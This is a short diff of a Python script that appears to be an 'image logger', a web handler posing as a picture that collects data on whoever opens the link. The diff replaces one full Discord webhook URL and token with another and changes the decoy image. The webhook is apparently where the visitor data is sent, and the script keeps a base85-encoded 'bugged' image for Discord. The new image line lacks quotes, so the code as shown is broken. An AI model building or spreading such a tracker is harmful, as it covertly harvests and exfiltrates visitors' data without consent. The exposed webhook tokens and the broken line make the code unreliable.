@@ -2,9 +2,9 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
+webhook = 'https://discord.com/api/webhooks/1384041693535535214/m_Odq9JRW7KT9sekZtl1FjqbHLI8gdwmHI7WAT6c_M8TPlZI0kZ5Ya6Ki1Z-I1o6VK6f'
 
-bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
+bindata = httpx.get(https://cdn.pfps.gg/pfps/7028-funny-cat.png).content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
